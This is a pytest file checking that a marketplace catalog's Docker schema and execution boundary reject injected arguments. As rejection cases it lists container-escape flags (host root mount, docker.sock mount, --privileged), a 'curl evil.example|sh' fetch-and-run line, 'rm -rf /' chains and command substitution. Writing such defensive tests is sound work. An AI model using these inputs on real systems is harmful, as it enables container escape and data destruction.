"""Marketplace catalog schema / loader validation tests

The focus is regression protection for the SAST finding "Stored Command Argument Injection":
the catalog's docker.args are snapshotted into the DB and later expanded into the argv of
`docker run`, so the schema boundary must make container-escape flags inexpressible.

Note: a character allowlist cannot stop this class of attack (`-v /:/host` consists entirely of
safe characters), which is why docker.args uses "default-deny + a list of allowed flags". The
escape-vector tests below pin exactly that.
"""
from pathlib import Path

import pytest
import yaml
from pydantic import ValidationError

from src.marketplace.argv_policy import (
    ArgvPolicyError,
    validate_command_tokens,
    validate_docker_args,
    validate_image_ref,
)
from src.marketplace.loader import CatalogLoader
from src.marketplace.schema import DockerSpec


# ---------------------------------------------------------------- args: escapes

# Every one of these passed the old character allowlist (and shlex.quote let them through too).
ESCAPE_VECTORS = [
    pytest.param(["-v", "/:/host"], id="mount-host-root"),
    pytest.param(["--volume", "/:/host"], id="mount-host-root-long"),
    pytest.param(
        ["-v", "/var/run/docker.sock:/var/run/docker.sock"], id="mount-docker-sock"
    ),
    pytest.param(["--privileged"], id="privileged"),
    pytest.param(["--pid=host"], id="pid-host-inline"),
    pytest.param(["--pid", "host"], id="pid-host-separate"),
    pytest.param(["--ipc", "host"], id="ipc-host"),
    pytest.param(["--cap-add", "SYS_ADMIN"], id="cap-add"),
    pytest.param(["--device", "/dev/kmsg"], id="device"),
    pytest.param(["--security-opt", "seccomp=unconfined"], id="security-opt"),
    pytest.param(["--userns", "host"], id="userns-host"),
    pytest.param(["--entrypoint", "/bin/sh"], id="entrypoint-override"),
    pytest.param(["--network", "host"], id="network-host-separate"),
    pytest.param(["--network=host"], id="network-host-inline"),
    pytest.param(["-d"], id="detach-short"),
    pytest.param(["--detach"], id="detach-long"),
    # Mixed in among legitimate flags; make sure the sequence parser is not carried past by the earlier legit tokens
    pytest.param(["--rm", "--privileged"], id="escape-after-legit"),
    pytest.param(["--network", "bridge", "-v", "/:/host"], id="escape-after-value-flag"),
]


@pytest.mark.parametrize("args", ESCAPE_VECTORS)
def test_escape_flags_rejected(args):
    with pytest.raises(ValidationError):
        DockerSpec(image="img", args=args)


# ---------------------------------------------------------------- args: legitimate

LEGIT_ARGS = [
    pytest.param(["--rm"], id="rm"),
    pytest.param([], id="empty"),
    pytest.param(["--rm", "--init"], id="rm-init"),
    pytest.param(["-i"], id="interactive"),
    pytest.param(["--network=bridge"], id="network-bridge-inline"),
    pytest.param(["--network", "bridge"], id="network-bridge-separate"),
    pytest.param(["--network", "none"], id="network-none"),
    # After consuming a value flag the parser must still recognise the next flag
    pytest.param(["--network", "bridge", "--rm"], id="value-flag-then-bare"),
    pytest.param(["--memory", "512m"], id="memory"),
    pytest.param(["--cpus", "1.5"], id="cpus"),
    pytest.param(["--pull", "always"], id="pull"),
]


@pytest.mark.parametrize("args", LEGIT_ARGS)
def test_legitimate_args_accepted(args):
    assert DockerSpec(image="img", args=args).args == args


def test_value_flag_missing_value_rejected():
    """`--network` at the end of the sequence without a value -> explicit error, not a silent pass"""
    with pytest.raises(ValidationError, match="missing a value"):
        DockerSpec(image="img", args=["--network"])


def test_value_flag_bad_value_rejected():
    with pytest.raises(ValidationError):
        DockerSpec(image="img", args=["--pull", "sometimes"])


# ------------------------------------------------------- trailing-newline bypass

# `$` matches before a trailing newline at the end of the string, so re.match(r"^...$", "--rm\n") is True.
# After switching everything to fullmatch, all of these must be rejected.
@pytest.mark.parametrize(
    "kwargs",
    [
        pytest.param({"image": "ubuntu\n"}, id="image"),
        pytest.param({"image": "img", "tag": "v1\n"}, id="tag"),
        pytest.param({"image": "img", "args": ["--rm\n"]}, id="args"),
        pytest.param({"image": "img", "command": ["./run\n"]}, id="command"),
    ],
)
def test_trailing_newline_rejected(kwargs):
    with pytest.raises(ValidationError):
        DockerSpec(**kwargs)


# ------------------------------------------------------------- image / tag


@pytest.mark.parametrize(
    "image",
    ["perplexity-mcp-server", "mit2i", "mcp/perplexity-ask", "ghcr.io/foo/bar",
     "localhost:5000/img"],
)
def test_valid_images_accepted(image):
    assert DockerSpec(image=image).image == image


@pytest.mark.parametrize("image", ["Evil;rm", "a b", "img$(id)", "-flag", ""])
def test_invalid_images_rejected(image):
    with pytest.raises(ValidationError):
        DockerSpec(image=image)


@pytest.mark.parametrize("tag", ["latest", "v1.0.0", "1.2.3-alpha_1"])
def test_valid_tags_accepted(tag):
    assert DockerSpec(image="img", tag=tag).tag == tag


@pytest.mark.parametrize("tag", ["latest; rm -rf /", "a b", "-lead", ""])
def test_invalid_tags_rejected(tag):
    """The tag was never validated before, yet it is joined into image:tag and stored in the DB"""
    with pytest.raises(ValidationError):
        DockerSpec(image="img", tag=tag)


# ----------------------------------------------------------------- command


def test_command_allows_entrypoint_args():
    """The command text2image actually uses; it must keep passing"""
    cmd = ["./MiT2I", "--config", "/app/config/config_google.yaml"]
    assert DockerSpec(image="mit2i", command=cmd).command == cmd


@pytest.mark.parametrize("command", [["a;b"], ["$(id)"], ["a b"], ["`id`"]])
def test_command_rejects_shell_metachars(command):
    with pytest.raises(ValidationError):
        DockerSpec(image="img", command=command)


# ------------------------------------------------------------ real catalog


@pytest.fixture(scope="module")
def real_catalog():
    catalog_dir = Path(__file__).parent.parent / "catalog"
    entries = CatalogLoader(catalog_dir).load_all()
    return entries


def test_real_catalog_loads_without_error(real_catalog):
    """The shipped catalog must not be wrongly rejected by the new validation"""
    assert set(real_catalog) == {"perplexity-ask"}


def test_real_catalog_args_unchanged(real_catalog):
    assert real_catalog["perplexity-ask"].docker.args == ["--rm"]


# --------------------------------------------------------- loader resilience


def _write_entry(directory: Path, name: str, docker: dict):
    payload = {
        "id": name,
        "name": name,
        "description": "test entry",
        "docker": docker,
    }
    (directory / f"{name}.yaml").write_text(
        yaml.safe_dump(payload), encoding="utf-8"
    )


def test_invalid_entry_is_skipped_not_fatal(tmp_path):
    """One broken file must not take down the whole marketplace listing (previously an unhandled 500)"""
    _write_entry(tmp_path, "good", {"image": "img", "tag": "v1", "args": ["--rm"]})
    _write_entry(tmp_path, "evil", {"image": "img", "args": ["-v", "/:/host"]})

    loader = CatalogLoader(tmp_path)
    entries = loader.load_all()

    assert set(entries) == {"good"}
    assert "evil.yaml" in loader.errors
    assert "-v" in loader.errors["evil.yaml"]


def test_duplicate_id_is_skipped(tmp_path):
    _write_entry(tmp_path, "dup_a", {"image": "img"})
    _write_entry(tmp_path, "dup_b", {"image": "img"})
    # Two files declare the same id
    (tmp_path / "dup_b.yaml").write_text(
        yaml.safe_dump({
            "id": "dup_a", "name": "dup_b", "description": "d",
            "docker": {"image": "img"},
        }),
        encoding="utf-8",
    )

    loader = CatalogLoader(tmp_path)
    entries = loader.load_all()

    assert set(entries) == {"dup_a"}
    assert "dup_b.yaml" in loader.errors


def test_missing_catalog_dir_yields_empty(tmp_path):
    loader = CatalogLoader(tmp_path / "does-not-exist")
    assert loader.load_all() == {}
    assert loader.errors == {}


def test_reload_clears_errors(tmp_path):
    _write_entry(tmp_path, "evil", {"image": "img", "args": ["--privileged"]})
    loader = CatalogLoader(tmp_path)
    loader.load_all()
    assert loader.errors

    (tmp_path / "evil.yaml").unlink()
    assert loader.reload() == {}
    assert loader.errors == {}


# ------------------------------------------- execution boundary (re-validated after the DB read)

# DockerSpec only guards the catalog write side. The stored-injection threat model includes
# "the attacker can already write to the DB"; that path bypasses the catalog, so the orchestrator
# must apply the very same policy again after reading image_args / image_command from the DB.
# The policy functions themselves are tested here (orchestrator._start_locked calls them directly).


TAMPERED_DB_ARGS = [
    pytest.param("--rm -v /:/host", id="append-volume"),
    pytest.param("--privileged", id="privileged"),
    pytest.param("--rm --pid=host", id="append-pid-host"),
    pytest.param("-v /var/run/docker.sock:/var/run/docker.sock", id="docker-sock"),
    pytest.param("--network host", id="network-host"),
]


@pytest.mark.parametrize("image_args", TAMPERED_DB_ARGS)
def test_tampered_db_image_args_refused(image_args):
    """After the DB has been tampered with, the execution boundary must still refuse"""
    with pytest.raises(ArgvPolicyError):
        validate_docker_args(image_args.split())


TAMPERED_DB_COMMANDS = [
    pytest.param(["sh", "-c", "curl evil.example|sh"], id="shell-pipe"),
    pytest.param(["$(id)"], id="command-substitution"),
    pytest.param(["`id`"], id="backticks"),
    pytest.param(["a;b"], id="semicolon"),
    pytest.param(["--config", "/app/x.yaml && rm -rf /"], id="and-chain"),
]


@pytest.mark.parametrize("command", TAMPERED_DB_COMMANDS)
def test_tampered_db_image_command_refused(command):
    with pytest.raises(ArgvPolicyError):
        validate_command_tokens(command)


def test_legit_db_row_still_starts():
    """The shipped text2image row must keep passing the execution boundary"""
    assert validate_docker_args("".split()) == []
    assert validate_command_tokens(
        ["./MiT2I", "--config", "/app/config/config_google.yaml"]
    ) == ["./MiT2I", "--config", "/app/config/config_google.yaml"]
    assert validate_docker_args("--rm".split()) == ["--rm"]


@pytest.mark.parametrize(
    "image_ref",
    ["mit2i:v1.0.0", "perplexity-mcp-server:latest", "ghcr.io/foo/bar:v1",
     "localhost:5000/img", "localhost:5000/img:v2", "alpine"],
)
def test_valid_image_refs_accepted(image_ref):
    """A registry host:port must not be mistaken for a tag"""
    assert validate_image_ref(image_ref) == image_ref


@pytest.mark.parametrize(
    "image_ref",
    ["img:latest; rm -rf /", "img:v1\n", "Evil;rm:latest", "img:tag with space"],
)
def test_invalid_image_refs_refused(image_ref):
    with pytest.raises(ArgvPolicyError):
        validate_image_ref(image_ref)


def test_policy_error_is_valueerror():
    """ArgvPolicyError must be a ValueError so Pydantic can convert it into a ValidationError"""
    assert issubclass(ArgvPolicyError, ValueError)


def test_schema_and_orchestrator_share_one_policy():
    """DockerSpec and the execution boundary must reject the same set of things (there is only one policy)"""
    for args in (["-v", "/:/host"], ["--privileged"], ["--network", "host"]):
        with pytest.raises(ValidationError):
            DockerSpec(image="img", args=args)
        with pytest.raises(ArgvPolicyError):
            validate_docker_args(args)
